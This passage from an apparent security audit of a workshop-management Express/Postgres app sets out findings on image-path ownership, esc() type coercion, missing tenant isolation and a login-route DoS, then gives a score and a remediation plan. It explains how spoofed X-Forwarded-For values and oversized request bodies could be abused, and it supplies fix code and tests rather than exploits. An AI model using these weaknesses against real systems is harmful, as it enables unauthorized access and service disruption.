ALTER TABLE images ADD COLUMN IF NOT EXISTS owner_coll text, ADD COLUMN IF NOT EXISTS owner_id text;
```
```js
app.post('/api/image', asyncH(async (req, res) => {
  const { ownerColl, ownerId, mime, base64 } = req.body || {};
  if (!ownerColl || !COLL[ownerColl]) return res.status(400).json({ error: 'ownerColl required' });
  const p = `${ownerColl}/${ownerId || req.auth.techId || 'misc'}/${crypto.randomUUID()}`; // server-generated, not client-chosen
  ...
  await pool.query(`INSERT INTO images (path, mime, bytes, owner_coll, owner_id, created_at) VALUES ($1,$2,$3,$4,$5,$6) ...`, [p, ...]);
}));
```
And add a periodic (or on-delete-trigger) cleanup: when a parent record referencing an image path is deleted, delete the matching `images` row in the same transaction.

**DB changes:** `owner_coll`/`owner_id` columns as above; optional scheduled cleanup job or `ON DELETE` trigger.

**Regression test:**
```js
test('a technician cannot overwrite an image path they did not create', async () => {
  const upload1 = await uploadImage(techA_token, { path: 'shared/photo1', base64: imgA });
  const res = await uploadImage(techB_token, { path: 'shared/photo1', base64: imgB }); // same path, different uploader
  assert.equal(res.status, 403);
});
```

**Risk if unfixed:** Low-severity data-integrity issue (image swap/deletion by an unrelated user) rather than a confidentiality breach, since paths are still effectively unguessable UUID-based in current usage — but it's an easy fix and closes the last open piece of A11.

---

### F12 — `esc()` throws on non-string values
**Module:** `public/index.html:2200`
**Severity:** Low

**Business impact:** `function esc(v){return(v||'').replace(...)}` — if `v` is a *truthy, non-string* value (a real JS `Number`, `Boolean`, or object, as opposed to a string), `(v||'')` evaluates to `v` itself (since it's truthy), and `.replace()` doesn't exist on numbers/booleans → uncaught `TypeError`, white-screening whichever view called it. Verified this is **not currently triggered** in practice: fields that look numeric (`v.mileage`, `jc.mileageIn`) are read via `document.getElementById(...).value`, which the DOM always returns as a `string` even for `<input type="number">`, so today's call sites happen to be safe. This is nonetheless a landmine: any future field sourced from a computed value (`.length`, arithmetic, JSON-imported legacy Firestore data where numeric fields really are numbers) will crash on render.

**How it manifests:** Static analysis (confirmed no live crash today via `grep` across all 120+ unique `esc(...)` call-site argument shapes — none currently pass a bare arithmetic/computed numeric expression).

**Root cause:** Missing type coercion in `esc()`.

**Recommended fix:**
```js
function esc(v){return String(v==null?'':v).replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
```
`String(v)` safely handles numbers, booleans, and `null`/`undefined` alike, and is a strict superset of the current behavior for strings.

**DB changes:** none.

**Regression test:**
```js
test('esc() does not throw on numbers/booleans', () => {
  assert.doesNotThrow(() => esc(45000));
  assert.doesNotThrow(() => esc(0));
  assert.doesNotThrow(() => esc(false));
  assert.equal(esc(45000), '45000');
});
```

**Risk if unfixed:** Low today, but a silent trap for the next data source (CSV import, API integration, restored backup with numeric JSON fields) — worth the one-line fix regardless.

---

### F13 — No multi-branch / tenant data isolation
**Module:** `db.js` (schema), `server.js` (`COLL` config)
**Severity:** Low (today) / High (if multi-branch ships)

**Business impact:** The schema and API have no notion of a branch or tenant — every table is global, every technician (regardless of which physical branch they work at) can see every customer, invoice, and cash account system-wide (this is actually just a restatement of F1's blast radius, but worth calling out separately because it's a *design gap*, not just an authorization bug: even a correctly role-gated technician would still see all branches' data unless a `branch_id` concept is introduced).

**How it manifests:** `db.js`'s `SCHEMA` has no `branch_id` column on any table; `server.js`'s `COLL` registry has no per-branch filtering anywhere in the `SELECT`/`INSERT`/`UPDATE` statements.

**Root cause:** Single-branch design assumption baked into the schema from the start (consistent with this being a single-workshop tool today, per `PRODUCT.md`).

**Recommended fix (only needed before a multi-branch deployment):** Add `branch_id text` to every document table, populate a `req.auth.branchId` on login, and filter every query by it:
```sql
ALTER TABLE customers ADD COLUMN IF NOT EXISTS branch_id text;
-- repeat for vehicles, job_cards, invoices, transactions, fin_accounts, appointments, parts
CREATE INDEX IF NOT EXISTS idx_customers_branch ON customers(branch_id);
```
```js
// every SELECT/UPDATE/DELETE in server.js gains a WHERE branch_id = $n (or is scoped for admin who may see all branches)
```

**DB changes:** as above; this is a genuinely non-trivial migration (touches every table and every query) — scope it as its own project, not a quick patch, if/when multi-branch is actually planned.

**Regression test:** deferred until the feature is scheduled.

**Risk if unfixed:** None today (single-branch deployment per current memory notes); becomes a Critical data-isolation failure the moment a second branch is onboarded onto the same database without this fix landing first.

---

### F14 — Unbounded login-guard memory + global 15 MB body limit on public routes
**Module:** `server.js:34` (`express.json({ limit: '15mb' })`), `server.js:113` (`loginFails` Map)
**Severity:** Low

**Business impact:** `express.json()` with a 15 MB limit is registered globally (server.js:34), before any route — including the unauthenticated `/api/login` and `/api/tech-login`. An attacker can send repeated 15 MB bodies to these public endpoints, forcing the server to parse each one before the handler ever runs, a cheap-to-mount, mild CPU/memory DoS lever. Separately, `loginFails` (server.js:113) is an in-process `Map` keyed by the (spoofable, per F2) `X-Forwarded-For` value with no eviction — an attacker sending many distinct spoofed IP values (trivial, see F2) grows this map without bound for the life of the process.

**How it manifests:** Code reading is sufficient; both are directly visible in the snippets already quoted for F2 and the top of `server.js`.

**Root cause:** Global middleware ordering and an unbounded in-memory cache, both reasonable simplifications that become liabilities once F2's header-spoofing gap is factored in.

**Recommended fix:**
```js
// Tighter limit for login-shaped routes; keep 15mb only where images actually need it (POST /api/image)
app.use('/api/login', express.json({ limit: '2kb' }));
app.use('/api/tech-login', express.json({ limit: '2kb' }));
app.use(express.json({ limit: '15mb' })); // remaining routes, registered after the tighter ones

// Evict old loginFails entries periodically
setInterval(() => {
  const now = Date.now();
  for (const [k, v] of loginFails) if (v.until && v.until < now) loginFails.delete(k);
}, 10 * 60 * 1000).unref();
```
Fixing F2's IP-derivation (`app.set('trust proxy', 1)`) also directly caps how many distinct, meaningful keys this map can ever contain, which is the more important half of this fix.

**DB changes:** none.

**Regression test:** load-style test verifying a large body to `/api/login` is rejected (`413`) before credential checking, and that `loginFails` size stays bounded under a burst of distinct-IP requests once F2 is fixed.

**Risk if unfixed:** Minor availability risk; not a data-confidentiality issue, and much less impactful than F2 itself (which subsumes most of the practical exposure here).

---

## Confirmed *not* vulnerable (verified, not just assumed)

- **SQL injection (dimension 3):** every `pool.query`/`client.query` call in `server.js` uses parameterized placeholders (`$1, $2, ...`) — read in full, no string-interpolated values found in any query. The one place a user-controlled path segment (`:coll`) could theoretically reach SQL is table/column names, and those are never taken from `req.params` directly — `COLL[req.params.coll]` is a lookup into a hardcoded allowlist object (server.js:38–49); an unrecognized `coll` falls through to `next()` (404), never reaching a query. The JSONB unique-index expression (`db.js:37-38`) is a static string in the schema migration, not built from user input. **Clean.**
- **`x-powered-by` header:** correctly disabled (`app.disable('x-powered-by')`, server.js:33) — confirmed absent from response headers.
- **`/api/image` MIME allowlist, size cap, `nosniff`:** all three present and correctly implemented (server.js:172,424,428,430, and the global `nosniff` at server.js:35) — the earlier A11 finding's core stored-XSS-via-image vector is closed. (Path ownership remains open — see F11.)
- **Raw Postgres error leakage (old B6):** `asyncH` (server.js:73–77) now catches every route handler and returns a generic `{ error: 'Server error...' }`, logging the real message server-side only. **Fixed.**
- **Technician PIN compared client-side (old A12, partially):** the comparison now happens server-side (`server.js:158`) — an improvement — but the PIN itself is still stored in plaintext JSONB (`data.pin`); see F2's recommendation to hash it.
- **Money rounding (dimension 5, partially):** `round2()` is applied server-side to invoice/transaction money fields (server.js:51,63–71) so float-dust "stuck in partial" bugs (old B2) are closed — but see F5 for the deeper issue that totals are still never *recomputed*, only rounded.

---

## Security Score: 34 / 100

**Scoring rationale** (100 = production-ready for a business handling customer PII and payment records; 0 = no protections at all):

| Category | Weight | Score | Notes |
|---|---|---|---|
| Authentication | 20 | 8/20 | Token mechanism exists and is well-built cryptographically (HMAC + timing-safe compare + expiry) but its secret derivation (F3) and the brute-forceable/spoofable login guard (F2) undermine it structurally. |
| Authorization | 20 | 2/20 | Essentially absent beyond "has *a* valid token" (F1) — this is the single biggest gap in the system. |
| Input validation / data integrity | 15 | 6/15 | Money rounding and a few atomic (row-locked) endpoints (`pay`, `adjust`) show real care, but core financial fields remain client-trusted (F5) and there's no schema/type enforcement at all. |
| XSS / output encoding | 15 | 9/15 | 239 disciplined `esc()` call sites is genuinely good coverage for a hand-rolled string-templated SPA — but the single-quote gap (F6) is a real, demonstrated hole, and the helper itself is fragile (F12). |
| Injection (SQL) | 10 | 10/10 | Clean — fully parameterized, allowlisted table routing. |
| Transport / headers | 10 | 3/10 | `nosniff` and disabled `x-powered-by` present; CSP/HSTS/frame-ancestors entirely absent (F9); DB TLS validation disabled (F10). |
| Audit / accountability | 5 | 0/5 | No audit trail anywhere (F8). |
| File upload | 5 | 4/5 | MIME/size/sniff hardening is solid; only path-ownership remains open (F11). |

**34/100** reflects an app with **genuinely good bones** in a few places (crypto-correct token signing, transactional row-locking on payments/stock, disciplined-if-imperfect output encoding, clean parameterized SQL) that is nonetheless **not safe to deploy multi-user today**, because the two highest-value gaps — broken authorization (F1) and a bypassable login guard (F2) — combine into a zero-credential path to full business-data compromise, and F3 undermines the auth layer's foundation even for a "just the admin" deployment.

---

## Remediation plan

### Critical — before go-live (do not deploy to real users until these ship)
1. **F3** — Require a dedicated, random `SESSION_SECRET`; fail startup if unset. Generate and rotate it now regardless (invalidates any tokens already issued under the current derived secret).
2. **F2** — Fix `X-Forwarded-For` trust (`app.set('trust proxy', 1)` + `req.ip`); add account-level (not just IP-level) lockout on `/api/tech-login`.
3. **F1** — Add role-based authorization on write routes at minimum (admin-only collections must reject `role:'tech'`); ideally ship ownership-scoped tech access to job cards.
4. **F5** — Recompute `invoices.total`/`subtotal`/`taxAmount` server-side from line items; stop trusting client-submitted totals.

### 30-day
5. **F4** — Token revocation (`jti` + `revoked_tokens` table) and a real `/api/logout` server call.
6. **F6** — Eliminate the `onclick`-with-unescaped-JS-string pattern (migrate to `data-*` + delegated listeners, or add and consistently use a dedicated `escJs()`).
7. **F7** — Move the session token out of `localStorage` into an `httpOnly` cookie (pairs naturally with the F4 work); add CSRF protection for the state-changing routes once cookies carry auth.
8. **F8** — Add the `audit_log` table and wire it into every write route; consider soft-delete alongside it.
9. **F9** — Add `helmet` with a CSP tuned to this app's actual inline-style usage, plus HSTS and `frame-ancestors`.
10. **F2 (PIN hardening)** — Hash technician PINs at rest; consider lengthening to 6 digits.

### Later (lower urgency, but tracked)
11. **F10** — Re-enable Postgres TLS certificate validation (`rejectUnauthorized: true`), verified against the real Neon connection string first.
12. **F11** — Server-generated, owner-scoped image paths + orphan cleanup.
13. **F12** — One-line `esc()` hardening (`String(v)` coercion).
14. **F14** — Per-route body size limits; `loginFails` eviction.
15. **F13** — Design and migrate branch/tenant isolation *before* (not after) a second branch is onboarded to a shared database.

---

## Appendix: verification commands run

All commands were run against the local dev server only (`http://localhost:3010`), using the owner's own `.env` admin credentials, and all test-data side effects were reverted in the same session (temp technician PIN cleared, test customer deleted, test technician status reverted, test invoice total restored to `50`). No destructive operations, no third-party targets, no credential guessing beyond the explicitly-labeled, immediately-reverted demonstrations above.
